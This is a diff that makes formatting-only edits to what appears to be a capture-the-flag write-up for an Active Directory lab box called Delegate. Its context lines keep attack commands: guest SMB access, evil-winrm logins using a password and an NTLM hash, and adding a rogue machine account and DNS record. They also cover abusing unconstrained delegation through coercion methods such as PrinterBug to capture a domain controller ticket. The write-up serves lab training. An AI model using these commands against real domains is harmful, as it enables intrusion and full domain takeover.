@@ -81,7 +81,7 @@ smbmap -H 10.129.123.78 -d 'delegate.vl' -u 'GUEST' -p ''
 smbclient.py 'delegate.vl'/'GUEST':''@10.129.123.78
 ```
 
-&#x20;**Success**: Successfully connected as GUEST user.
+**Success**: Successfully connected as GUEST user.
 
 #### NETLOGON Share Access
 
@@ -203,7 +203,7 @@ evil-winrm -i 10.129.123.78 -u 'delegate.vl\N.Thompson' -p 'KALEB_2341'
 type C:\Users\N.Thompson\Desktop\user.txt
 ```
 
-&#x20;**User Flag Obtained**: Successfully retrieved user.txt from N.Thompson's desktop.
+**User Flag Obtained**: Successfully retrieved user.txt from N.Thompson's desktop.
 
 ***
 
@@ -260,7 +260,7 @@ addcomputer.py -computer-name zero -computer-pass 'pa$$w0rd' -dc-ip 10.129.123.7
 * **Name**: `zero$`
 * **Password**: `pa$$w0rd`
 
-&#x20;**Success**: Machine account `zero$` added to domain.
+**Success**: Machine account `zero$` added to domain.
 
 #### Step 3: DNS Record Manipulation
 
@@ -275,7 +275,7 @@ dnstool.py -u 'delegate.vl\zero$' -p 'pa$$w0rd' --action add --record zero.deleg
 * **Hostname**: `zero.delegate.vl`
 * **IP**: `10.10.14.xxx` (attacker's tun0 interface)
 
-&#x20;**Success**: DNS record created pointing to attacker machine.
+**Success**: DNS record created pointing to attacker machine.
 
 #### Step 4: Machine Account Configuration
 
@@ -298,7 +298,7 @@ Set-ADComputer zero -ServicePrincipalNames @{Add='HOST/zero'}
 Get-ADComputer zero -Properties ServicePrincipalNames,DNSHostName
 ```
 
-&#x20;**Confirmed**: Machine account properly configured with hostname and SPNs.
+**Confirmed**: Machine account properly configured with hostname and SPNs.
 
 #### Step 5: Enable Unconstrained Delegation
 
@@ -331,7 +331,7 @@ dig @10.129.123.78 zero.delegate.vl +noall +answer
 zero.delegate.vl. 3600 IN A 10.10.14.xxx
 ```
 
-&#x20;**Confirmed**: DNS entry successfully resolves to attacker IP.
+**Confirmed**: DNS entry successfully resolves to attacker IP.
 
 ***
 
@@ -366,7 +366,7 @@ netexec smb dc1.delegate.vl -u 'zero$' -p 'pa$$w0rd' -M coerce_plus
 
 **Discovered Methods**:
 
-* PrinterBug  (available)
+* PrinterBug (available)
 * PetitPotam
 * ShadowCoerce
 * DFSCoerce
@@ -389,7 +389,7 @@ netexec smb dc1.delegate.vl -u 'zero$' -p 'pa$$w0rd' -M coerce_plus -o LISTENER=
 4. Due to unconstrained delegation, we receive DC1's TGT
 5. TGT is automatically saved by krbrelayx
 
-&#x20;**Success**: Domain Controller TGT captured!
+**Success**: Domain Controller TGT captured!
 
 **Captured Ticket**:
 
@@ -446,8 +446,8 @@ evil-winrm -i dc1.delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-&#x20;**Root Flag Obtained**: Full domain compromise achieved!
+**Root Flag Obtained**: Full domain compromise achieved!
 
 ***
 
-<figure><img src="../../../../.gitbook/assets/complete (35).gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
